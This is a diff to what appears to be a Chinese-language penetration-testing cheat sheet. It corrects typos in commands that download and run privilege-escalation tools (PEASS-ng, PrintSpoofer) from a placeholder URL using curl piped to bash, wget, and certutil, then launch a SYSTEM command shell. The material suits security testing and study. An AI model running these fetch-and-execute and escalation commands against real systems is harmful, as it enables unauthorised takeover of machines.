@@ -135,7 +135,7 @@ tools/
 ```
 官方地址：https://github.com/peass-ng/PEASS-ng/releases/download/20260315-d7c1e6ce/
 curl $downloadurl | bash
-cd /tmp && wget $downloadurl && chmod +x $badfileh && ./$badfile
+cd /tmp && wget $downloadurl && chmod +x $badfile && ./$badfile
 
 ###
 第一条命令适用于有curl的情况下，第二条命令适用于没有curl但有wget的情况下
@@ -191,7 +191,7 @@ C:\windows\temp\$badfile
 ```
 项目地址:https://github.com/itm4n/PrintSpoofer
 certutil -urlcache -split -f $downloadurl C:\windows\temp\$badile
-C:\windows\temp\$file -i -c cmd
+C:\windows\temp\$badfile -i -c cmd
 
 ###
 这是一个利用SeImpersonatePrivilege特权进行提权的程序
